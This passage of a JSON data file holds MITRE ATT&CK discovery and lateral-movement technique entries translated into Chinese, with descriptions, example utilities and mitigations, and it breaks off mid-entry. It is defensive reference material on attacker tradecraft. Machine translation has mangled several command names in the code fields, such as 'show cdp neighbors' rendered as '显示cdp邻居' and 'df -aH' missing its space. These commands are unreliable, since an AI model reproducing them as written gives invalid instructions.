                            "content": "C:\\Windows\\System32\\"
                        },
                        {
                            "type": "text",
                            "content": "）中，并在"
                        },
                        {
                            "type": "code",
                            "content": "HKEY_local_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages"
                        },
                        {
                            "type": "text",
                            "content": "中具有相应的条目。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1120",
        "name": "Peripheral Device Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能试图收集有关连接到计算机系统的附加外围设备和组件的信息。外围设备可以包括支持各种功能的辅助资源，如键盘、打印机、相机、智能卡读卡器或可移动存储。该信息可以用于增强他们对系统和网络环境的认识，或者可以用于进一步的动作。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1069",
        "name": "Permission Groups Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [
            {
                "id": "T1069.001",
                "name": "Local Groups"
            },
            {
                "id": "T1069.002",
                "name": "Domain Groups"
            },
            {
                "id": "T1069.003",
                "name": "Cloud Groups"
            }
        ],
        "version": "2.5",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会尝试发现组和权限设置。这些信息可以帮助对手确定哪些用户帐户和组可用，特定组中用户的成员资格，以及哪些用户和组具有提升的权限。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可能会尝试以多种不同的方式发现组权限设置。这些数据可以向对手提供关于受损环境的信息，这些信息可以用于后续活动和目标定位。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1057",
        "name": "Process Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "1.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能试图获取有关系统上正在运行的进程的信息。所获得的信息可用于了解在网络内的系统上运行的通用软件/应用程序。对手可以在自动发现过程中使用过程发现的信息来塑造后续行为，包括对手是否完全感染目标和/或尝试特定行动。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在Windows环境中，对手可以通过cmd或"
                },
                {
                    "type": "code",
                    "content": "Get-Process"
                },
                {
                    "type": "text",
                    "content": "通过PowerShell使用Tasklist实用程序获取有关运行进程的详细信息。还可以从本机API调用（如＜code＞CreateToolhelp32Snapshot＜/code＞）的输出中提取有关进程的信息。在Mac和Linux中，这是通过"
                },
                {
                    "type": "code",
                    "content": "ps"
                },
                {
                    "type": "text",
                    "content": "命令实现的。对手也可以选择通过/proc枚举进程。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在网络设备上，网络设备CLI命令（如＜code＞show processes＜/code＞）可用于显示当前运行的进程。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1012",
        "name": "Query Registry",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会与Windows注册表交互，以收集有关系统、配置和已安装软件的信息。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "注册表包含大量有关操作系统、配置、软件和安全性的信息。使用Reg实用程序可以很容易地查询信息，尽管存在其他访问注册表的方式。其中一些信息可能有助于对手在网络中进一步开展行动。对手可以在自动发现过程中使用查询注册表中的信息来形成后续行为，包括对手是否完全感染目标和/或尝试特定行动。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1018",
        "name": "Remote System Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "3.5",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能试图通过IP地址、主机名或网络上的其他逻辑标识符从当前系统获得其他系统的列表，这些标识符可能用于横向移动。远程访问工具中可能存在启用此功能的功能，但操作系统上可用的实用程序也可以使用，如Ping或使用net的"
                },
                {
                    "type": "code",
                    "content": "net视图"
                },
                {
                    "type": "text",
                    "content": "。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手还可以分析来自本地主机文件（例如："
                },
                {
                    "type": "code",
                    "content": "C:\\Windows\\System32\\Drivers\\etc\\hosts"
                },
                {
                    "type": "text",
                    "content": "或"
                },
                {
                    "type": "code",
                    "content": "/etc/hosts"
                },
                {
                    "type": "text",
                    "content": "）或其他被动手段（如本地Arp缓存项）的数据，以发现环境中存在远程系统。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人还可能以发现网络基础设施为目标，并利用网络设备上的网络设备CLI命令来收集有关网络内系统的详细信息（例如，"
                },
                {
                    "type": "code",
                    "content": "显示cdp邻居"
                },
                {
                    "type": "text",
                    "content": "，"
                },
                {
                    "type": "code",
                    "content": "show arp"
                },
                {
                    "type": "text",
                    "content": "）。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1518",
        "name": "Software Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [
            {
                "id": "T1518.001",
                "name": "Security Software Discovery"
            }
        ],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能试图获得安装在系统或云环境中的软件和软件版本的列表。敌人可以在自动发现过程中使用来自软件发现的信息来形成后续行为，包括敌人是否完全感染目标和/或尝试特定行动。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会出于各种原因试图枚举软件，例如弄清楚存在哪些安全措施，或者受损系统的软件版本是否容易受到特权升级的攻击。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1082",
        "name": "System Information Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "2.5",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能试图获取有关操作系统和硬件的详细信息，包括版本、补丁程序、修补程序、service Pack和体系结构。对手可以在自动发现过程中使用来自系统信息发现的信息来形成后续行为，包括对手是否完全感染目标和/或尝试特定行动。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "Systeminfo等工具可用于收集详细的系统信息。如果使用特权访问运行，则可以通过macOS上的"
                },
                {
                    "type": "code",
                    "content": "systemsetup"
                },
                {
                    "type": "text",
                    "content": "配置工具收集系统数据的细分。例如，具有用户级访问权限的对手可以执行"
                },
                {
                    "type": "code",
                    "content": "df-aH"
                },
                {
                    "type": "text",
                    "content": "命令，以获得当前安装的磁盘和相关的免费可用空间。敌人还可以利用网络设备上的网络设备CLI来收集详细的系统信息（例如"
                },
                {
                    "type": "code",
                    "content": "显示版本"
                },
                {
                    "type": "text",
                    "content": "）。系统信息发现与从其他形式的发现和侦察中收集的信息相结合，可以推动有效载荷的开发和隐藏。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "AWS、GCP和Azure等基础设施即服务（IaaS）云提供商允许通过API访问实例和虚拟机信息。成功通过身份验证的API调用可以返回数据，如操作系统平台和特定实例的状态或虚拟机的模型视图。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1614",
        "name": "System Location Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [
            {
                "id": "T1614.001",
                "name": "System Language Discovery"
            }
        ],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会收集信息，试图计算受害者宿主的地理位置。对手可以在自动发现过程中使用来自系统位置发现的信息来形成后续行为，包括对手是否完全感染目标和/或尝试特定行动。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能试图使用各种系统检查来推断系统的位置，例如时区、键盘布局和/或语言设置。Windows API函数（如"
                },
                {
                    "type": "code",
                    "content": "GetLocaleInfoW"
                },
                {
                    "type": "text",
                    "content": "）也可用于确定主机的区域设置。在云环境中，还可以通过从实例访问实例元数据服务来发现实例的可用性区域。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手还可以尝试使用IP寻址来推断受害者主机的位置，例如通过在线地理位置IP查找服务。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1016",
        "name": "System Network Configuration Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [
            {
                "id": "T1016.001",
                "name": "Internet Connection Discovery"
            },
            {
                "id": "T1016.002",
                "name": "Wi-Fi Discovery"
            }
        ],
        "version": "1.6",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以通过远程系统的信息发现来寻找关于他们访问的系统的网络配置和设置的细节，例如IP和/或MAC地址。有几个操作系统管理实用程序可用于收集这些信息。示例包括Arp、ipconfig/ifconfig、nbtstat和route。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手还可以利用网络设备上的网络设备CLI来收集有关配置和设置的信息，例如已配置接口的IP地址和静态/动态路由（例如，"
                },
                {
                    "type": "code",
                    "content": "显示IP路由"
                },
                {
                    "type": "text",
                    "content": "，"
                },
                {
                    "type": "code",
                    "content": "显示IP接口"
                },
                {
                    "type": "text",
                    "content": "）。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可以在自动发现期间使用来自系统网络配置发现的信息来形成后续行为，包括确定目标网络内的某些访问以及下一步要做的操作。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1049",
        "name": "System Network Connections Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "2.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能试图通过在网络上查询信息来获得与他们当前访问的受损系统或远程系统的网络连接列表。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "获得对作为基于云的环境的一部分的系统的访问权的对手可以绘制出虚拟私有云或虚拟网络，以便确定连接了什么系统和服务。根据操作系统的不同，所执行的动作可能是相同类型的发现技术，但所得信息可能包括与对手目标相关的网络云环境的细节。云提供商的虚拟网络可能有不同的运行方式。类似地，访问网络设备的对手也可以执行类似的发现活动，以收集有关连接的系统和服务的信息。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "获取此信息的实用程序和命令包括netstat、“网络使用”和与net的“网络会话”。在Mac和Linux中，netstat和＜code＞lsof</code＞可用于列出当前连接"
                },
                {
                    "type": "code",
                    "content": "who-a"
                },
                {
                    "type": "text",
                    "content": "和"
                },
                {
                    "type": "code",
                    "content": "w"
                },
                {
                    "type": "text",
                    "content": "可用于显示当前登录的用户，类似于“网络会话”。此外，还可以使用网络设备和网络设备CLI的内置功能（例如，"
                },
                {
                    "type": "code",
                    "content": "显示ip套接字"
                },
                {
                    "type": "text",
                    "content": "，"
                },
                {
                    "type": "code",
                    "content": "show tcp short"
                },
                {
                    "type": "text",
                    "content": "）。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1033",
        "name": "System Owner/User Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "1.5",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能试图识别主要用户、当前登录的用户、通常使用系统的用户集，或者用户是否正在积极使用系统。例如，他们可以通过检索帐户用户名或使用操作系统凭据转储来完成此操作。可以使用其他发现技术以多种不同的方式收集信息，因为用户和用户名详细信息在整个系统中普遍存在，并且包括运行进程所有权、文件/目录所有权、会话信息和系统日志。对手可以在自动发现过程中使用来自系统所有者/用户发现的信息来塑造后续行为，包括对手是否完全感染目标和/或尝试特定行动。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "各种实用程序和命令可能会获取此信息，包括"
                },
                {
                    "type": "code",
                    "content": "whoami"
                },
                {
                    "type": "text",
                    "content": "。在macOS和Linux中，当前登录的用户可以用"
                },
                {
                    "type": "code",
                    "content": "w"
                },
                {
                    "type": "text",
                    "content": "和"
                },
                {
                    "type": "code",
                    "content": "who"
                },
                {
                    "type": "text",
                    "content": "来标识。在macOS上，＜code＞dscl。list/Users|grep-v'_'</code>命令也可以用于枚举用户帐户。环境变量，如"
                },
                {
                    "type": "code",
                    "content": "%USERNAME%"
                },
                {
                    "type": "text",
                    "content": "和"
                },
                {
                    "type": "code",
                    "content": "$USER"
                },
                {
                    "type": "text",
                    "content": "，也可用于访问此信息。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在网络设备上，网络设备CLI命令（如"
                },
                {
                    "type": "code",
                    "content": "show users"
                },
                {
                    "type": "text",
                    "content": "和"
                },
                {
                    "type": "code",
                    "content": "show ssh"
                },
                {
                    "type": "text",
                    "content": "）可用于显示当前登录到设备的用户。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1007",
        "name": "System Service Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "1.5",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会试图收集有关已注册的本地系统服务的信息。对手可以使用工具以及操作系统实用程序命令（如"
                },
                {
                    "type": "code",
                    "content": "sc query"
                },
                {
                    "type": "text",
                    "content": "、"
                },
                {
                    "type": "code",
                    "content": "tasklist/svc"
                },
                {
                    "type": "text",
                    "content": "，"
                },
                {
                    "type": "code",
                    "content": "systemctl--type=service"
                },
                {
                    "type": "text",
                    "content": "和"
                },
                {
                    "type": "code",
                    "content": "net start"
                },
                {
                    "type": "text",
                    "content": "）来获取有关服务的信息。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可以在自动发现过程中使用来自系统服务发现的信息来形成后续行为，包括对手是否完全感染目标和/或尝试特定行动。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1124",
        "name": "System Time Discovery",
        "tactics": [
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以从本地或远程系统收集系统时间和/或时区。系统时间由域中的Windows时间服务设置和存储，以保持企业网络中系统和服务之间的时间同步。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "可以通过多种方式收集系统时间信息，例如使用Windows上的Net，通过执行"
                },
                {
                    "type": "code",
                    "content": "Net time\\hostname"
                },
                {
                    "type": "text",
                    "content": "来收集远程系统上的系统时间。受害者的时区也可以从当前系统时间推断出来，或者通过使用"
                },
                {
                    "type": "code",
                    "content": "w32tm/tz"
                },
                {
                    "type": "text",
                    "content": "来收集。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在网络设备上，可以使用network Device CLI命令（如＜code＞show clock detail＜/code＞）查看当前时间配置。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "该信息可用于执行其他技术，例如执行具有预定任务/作业的文件，或者用于基于时区发现位置信息以帮助确定受害者目标（即系统位置发现）。敌人也可能将系统时间知识作为定时炸弹的一部分，或将执行延迟到指定的日期/时间。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1497",
        "name": "Virtualization/Sandbox Evasion",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [
            {
                "id": "T1497.001",
                "name": "System Checks"
            },
            {
                "id": "T1497.002",
                "name": "User Activity Based Checks"
            },
            {
                "id": "T1497.003",
                "name": "Time Based Evasion"
            }
        ],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以采用各种手段来检测和避免虚拟化和分析环境。这可以包括基于对指示虚拟机环境（VME）或沙箱的工件的存在的检查结果来改变行为。如果对手检测到VME，他们可能会更改其恶意软件以脱离受害者或隐藏植入物的核心功能。它们还可以在丢弃次要或附加有效载荷之前搜索VME工件。在自动发现过程中，对手可能会使用从虚拟化/沙盒规避中学到的信息来塑造后续行为。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可以使用多种方法来实现虚拟化/沙盒规避，例如检查安全监控工具（例如Sysinternals、Wireshark等）或与分析或虚拟化相关的其他系统工件。对手还可以检查合法的用户活动，以帮助确定它是否处于分析环境中。其他方法包括在恶意软件代码中使用睡眠定时器或循环，以避免在临时沙箱中操作。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1210",
        "name": "Exploitation of Remote Services",
        "tactics": [
            {
                "id": "TA0008",
                "name": "Lateral Movement"
            }
        ],
        "subs": [],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "一旦进入网络，敌人可能会利用远程服务获得对内部系统的未经授权的访问。当对手利用程序、服务或操作系统软件或内核本身中的编程错误来执行对手控制的代码时，就会发生软件漏洞的利用。折衷后利用远程服务的一个共同目标是横向移动，以便能够访问远程系统。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可能需要确定远程系统是否处于易受攻击状态，这可以通过网络服务发现或其他发现方法来完成，寻找可能部署在网络中的常见易受攻击的软件，缺乏可能指示漏洞的某些补丁，或可用于检测或遏制远程利用的安全软件。服务器可能是横向移动利用的高价值目标，但如果端点系统提供优势或访问额外资源，则它们也可能面临风险。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "常见服务（如SMB和RDP）以及内部网络（如MySQL和web服务器服务）中可能使用的应用程序中存在几个众所周知的漏洞。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "根据易受攻击的远程服务的权限级别，对手也可能因横向移动利用而实现特权升级利用。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1048",
                "name": "应用程序隔离和沙盒",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过使用沙箱利用未发现或未修补的漏洞，使对手难以推进行动。其他类型的虚拟化和应用程序细分也可以减轻某些类型的利用带来的影响。这些系统中可能仍然存在其他漏洞和弱点的风险。"
                        }
                    ]
                ]
            },
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "尽量减少可用服务，只提供必要的服务。"
                        }
                    ]
                ]
            },
            {
                "id": "M1050",
                "name": "利用漏洞保护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "查找利用漏洞期间使用的行为的安全应用程序，如Windows Defender Exploit Guard（WDEG）和增强型缓解体验工具包（EMET），可用于缓解某些利用行为。控制流完整性检查是另一种可能识别和阻止软件利用的方法。其中许多保护取决于体系结构和目标应用程序二进制文件的兼容性，可能不适用于所有目标软件或服务。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "适当地划分网络和系统，以减少对关键系统和服务的访问，从而采用受控方法。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "最小化服务帐户的权限和访问，以限制利用的影响。"
                        }
                    ]
                ]
            },
            {
                "id": "M1019",
                "name": "威胁情报计划",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "开发强大的网络威胁情报能力，以确定哪些类型和级别的威胁可能使用软件攻击，以及针对特定组织的0天。"
                        }
                    ]
                ]
            },
            {
                "id": "M1051",
                "name": "更新软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过对内部企业端点和服务器使用补丁管理，定期更新软件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1016",
                "name": "漏洞扫描",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "定期扫描内部网络中的可用服务，以识别新的和潜在的易受攻击的服务。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1534",
        "name": "Internal Spearphishing",
        "tactics": [
            {
                "id": "TA0008",
                "name": "Lateral Movement"
            }
        ],
        "subs": [],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会使用内部鱼叉式网络钓鱼来获取额外信息，或在同一组织内的其他用户已经可以访问环境中的帐户或系统后利用这些用户。内部鱼叉式网络钓鱼是一种多阶段的活动，通过使用以前安装的恶意软件控制用户的设备或破坏用户的帐户凭据来拥有电子邮件帐户。敌人试图利用可信的内部帐户来增加诱使目标上当的可能性。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "作为内部鱼叉式网络钓鱼的一部分，攻击者可以利用鱼叉式网站钓鱼附件或鱼叉式链接来传递有效负载或重定向到外部网站，以通过模拟电子邮件登录界面的网站上的输入捕获来捕获凭据。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "曾发生过使用内部鱼叉式网络钓鱼的显著事件。Eye Pyramid活动使用带有恶意附件的网络钓鱼电子邮件在受害者之间进行横向移动，在此过程中危害了近18000个电子邮件帐户。叙利亚电子军（SEA）泄露了英国《金融时报》的电子邮件账户，以窃取更多的账户凭据。一旦英国《金融时报》获悉这一活动并开始警告员工这一威胁，SEA就发送了模仿英国《金融泰晤士报》IT部门的钓鱼电子邮件，并能够危害更多用户。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1570",
        "name": "Lateral Tool Transfer",
        "tactics": [
            {
                "id": "TA0008",
                "name": "Lateral Movement"
            }
        ],
        "subs": [],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会在受损环境中的系统之间传输工具或其他文件。一旦被带入受害者环境（即，进入工具传输），文件就可以从一个系统复制到另一个系统，以在操作过程中放置对手工具或其他文件。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可以使用固有的文件共享协议（如通过SMB/Windows管理共享到连接的网络共享的文件共享）在内部受害者系统之间复制文件，以支持横向移动，或通过远程桌面协议进行身份验证的连接。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "文件也可以使用受害者系统上的本机或其他现有工具进行传输，如scp、rsync、curl、sftp和ftp。在某些情况下，对手可能能够利用Dropbox或OneDrive等网络服务，通过共享的自动同步文件夹将文件从一台机器复制到另一台机器。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1037",
                "name": "过滤网络流量",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "考虑使用主机防火墙来限制文件共享通信（如SMB）。"
                        }
                    ]
                ]
            },
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用网络签名来识别特定对手恶意软件的流量或通过已知工具和协议（如FTP）进行的异常数据传输的网络入侵检测和预防系统可以用于减轻网络级别的活动。签名通常用于协议中的唯一指示符，并且可能基于特定对手或工具使用的特定模糊技术，并且可能在各种恶意软件系列和版本中有所不同。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1563",
        "name": "Remote Service Session Hijacking",
        "tactics": [
            {
                "id": "TA0008",
                "name": "Lateral Movement"
            }
        ],
        "subs": [
            {
                "id": "T1563.001",
                "name": "SSH Hijacking"
            },
            {
                "id": "T1563.002",
                "name": "RDP Hijacking"
            }
        ],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以控制与远程服务的预先存在的会话，以便在环境中横向移动。用户可以使用有效凭据登录到专门设计用于接受远程连接的服务，如telnet、SSH和RDP。当用户登录到一个服务时，将建立一个会话，允许他们与该服务保持持续的交互。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会征用这些会话在远程系统上执行操作。远程服务会话劫持与使用远程服务不同，因为它劫持了现有会话，而不是使用有效帐户创建新会话。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "如果不必要，请禁用远程服务（例如SSH、RDP等）。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "启用防火墙规则以阻止网络内网络安全区域之间不必要的流量。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "除非必要，否则不允许以特权帐户的身份远程访问服务。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "如果需要远程访问，请限制远程用户权限。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1021",
        "name": "Remote Services",
        "tactics": [
            {
                "id": "TA0008",
                "name": "Lateral Movement"
            }
        ],
        "subs": [
            {
                "id": "T1021.001",
                "name": "Remote Desktop Protocol"
            },
            {
                "id": "T1021.002",
                "name": "SMB/Windows Admin Shares"
            },
            {
                "id": "T1021.003",
                "name": "Distributed Component Object Model"
            },
            {
                "id": "T1021.004",
                "name": "SSH"
            },
            {
                "id": "T1021.005",
                "name": "VNC"
            },
            {
                "id": "T1021.006",
                "name": "Windows Remote Management"
            },
            {
                "id": "T1021.007",
                "name": "Cloud Services"
            },
            {
                "id": "T1021.008",
                "name": "Direct Cloud VM Connections"
            }
        ],
        "version": "1.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以使用有效帐户登录到接受远程连接的服务，如telnet、SSH和VNC。然后，对手可以作为登录用户执行动作。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在企业环境中，服务器和工作站可以组织到域中。域提供集中的身份管理，允许用户在整个网络中使用一组凭据登录。如果对手能够获得一组有效的域凭据，他们可以使用远程访问协议（如安全外壳（SSH）或远程桌面协议（RDP））登录到许多不同的机器。他们还可以登录到可访问的SaaS或IaaS服务，例如将他们的身份联合到域的服务。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "合法的应用程序（如软件部署工具和其他管理程序）可以利用远程服务访问远程主机。例如，macOS上的Apple Remote Desktop（ARD）是用于远程管理的本地软件。ARD利用多种协议，包括用于发送屏幕和控制缓冲区的VNC，以及用于安全文件传输的SSH。敌人可以滥用ARD等应用程序来获得远程代码执行并执行横向移动。在10.14之前的macOS版本中，对手可以将SSH会话升级为ARD会话，这使对手能够在无需用户交互的情况下接受TCC（透明、同意和控制）提示并获得数据访问权限。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "如果不需要远程服务，例如直接连接到云虚拟机的能力，请在可行的情况下禁用这些连接类型。"
                        }
                    ]
                ]
            },
            {
                "id": "M1032",
                "name": "多因素身份验证",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在可能的情况下，对远程服务登录使用多因素身份验证。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制可以使用远程服务的帐户。限制泄露风险较高的帐户的权限；例如，配置SSH以便用户只能运行特定的程序。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1091",
        "name": "Replication Through Removable Media",
        "tactics": [
            {
                "id": "TA0008",
                "name": "Lateral Movement"
            },
            {
                "id": "TA0001",
                "name": "Initial Access"
            }
        ],
        "subs": [],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "通过将恶意软件复制到可移动媒体，并在媒体插入系统并执行时利用自动运行功能，敌人可能会转移到系统上，可能是那些处于断开连接或空气间隙网络上的系统。在横向移动的情况下，这可能是通过修改存储在可移动媒体上的可执行文件，或者通过复制恶意软件并将其重命名为合法文件来诱骗用户在单独的系统上执行。在初始访问的情况下，这可能通过手动操作介质、修改用于初始格式化介质的系统或修改介质的固件本身来实现。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "如果通过USB连接，移动设备也可能被用来感染带有恶意软件的PC。这种感染可以使用设备（Android、iOS等）实现，在某些情况下，还可以使用USB充电电缆。例如，当智能手机连接到系统时，其安装方式可能类似于USB连接的磁盘驱动器。如果移动设备上存在与连接的系统兼容的恶意软件，则该恶意软件可能会感染机器（尤其是在启用了自动运行功能的情况下）。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1040",
                "name": "端点上的行为预防",
                "description": [
                    [
                        {
                            "type": "text",
